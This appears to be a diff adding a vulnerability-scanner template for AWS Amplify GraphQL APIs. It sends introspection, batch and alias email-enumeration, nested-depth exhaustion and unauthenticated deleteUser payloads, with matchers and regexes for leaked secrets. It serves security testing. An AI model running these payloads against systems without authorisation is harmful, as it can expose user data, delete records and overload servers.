@@ -1,0 +1,138 @@
+id: amplify-graphql-security
+info:
+  name: AWS Amplify GraphQL Security Tests
+  author: AmpSwiftUI
+  severity: high
+  description: Security tests for AWS Amplify GraphQL APIs
+  tags: mobile,graphql,amplify,aws,api
+
+variables:
+  graphql_queries:
+    introspection: |
+      {"query":"query{__schema{types{name,fields{name,type{name}}}}}"}
+    batch: |
+      [{"query":"query{user(id:1){email}}"},{"query":"query{user(id:2){email}}"},{"query":"query{user(id:3){email}}"}]
+    depth_attack: |
+      {"query":"query{user{posts{comments{replies{likes{user{posts{comments{replies{likes{user{email}}}}}}}}}}}}"}
+    alias_attack: |
+      {"query":"query{a1:user(id:1){email}a2:user(id:2){email}a3:user(id:3){email}a4:user(id:4){email}a5:user(id:5){email}}"}
+
+http:
+  - raw:
+      # Test 1: Introspection enabled
+      - |
+        POST {{BaseURL}}/graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: aws-amplify/5.0.0 iOS/17.0
+        X-Device-Type: iPhone
+        X-Amz-User-Agent: aws-amplify/5.0.0
+        Accept: application/json
+        
+        {{graphql_queries.introspection}}
+        
+      # Test 2: Batch query attack
+      - |
+        POST {{BaseURL}}/graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: aws-amplify/5.0.0 iOS/17.0
+        X-Device-Type: iPhone
+        Accept: application/json
+        
+        {{graphql_queries.batch}}
+        
+      # Test 3: Depth attack
+      - |
+        POST {{BaseURL}}/graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: aws-amplify/5.0.0 iOS/17.0
+        X-Device-Type: iPhone
+        Accept: application/json
+        
+        {{graphql_queries.depth_attack}}
+        
+      # Test 4: Alias-based resource exhaustion
+      - |
+        POST {{BaseURL}}/graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: aws-amplify/5.0.0 iOS/17.0
+        X-Device-Type: iPhone
+        Accept: application/json
+        
+        {{graphql_queries.alias_attack}}
+        
+      # Test 5: Missing authorization
+      - |
+        POST {{BaseURL}}/graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: aws-amplify/5.0.0 iOS/17.0
+        X-Device-Type: iPhone
+        Accept: application/json
+        
+        {"query":"mutation{deleteUser(id:1)}"}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        name: introspection-enabled
+        part: body
+        words:
+          - "__schema"
+          - "__Type"
+          - "queryType"
+        condition: and
+        
+      - type: word
+        name: batch-enabled
+        part: body
+        words:
+          - '['
+          - 'data'
+          - ']'
+        condition: and
+        
+      - type: word
+        name: depth-not-limited
+        part: body
+        words:
+          - "comments"
+          - "replies"
+          - "likes"
+        condition: and
+        
+      - type: word
+        name: mutation-without-auth
+        part: body
+        words:
+          - "deleteUser"
+          - "success"
+        condition: and
+        
+      - type: regex
+        name: error-disclosure
+        part: body
+        regex:
+          - "stack.*at.*\\("
+          - "graphql.*error"
+          - "Internal Server Error"
+          
+    extractors:
+      - type: json
+        name: schema-types
+        part: body
+        json:
+          - ".data.__schema.types[].name"
+          
+      - type: regex
+        name: sensitive-fields
+        part: body
+        regex:
+          - "password"
+          - "secret"
+          - "token"
+          - "apiKey"
+          - "privateKey"
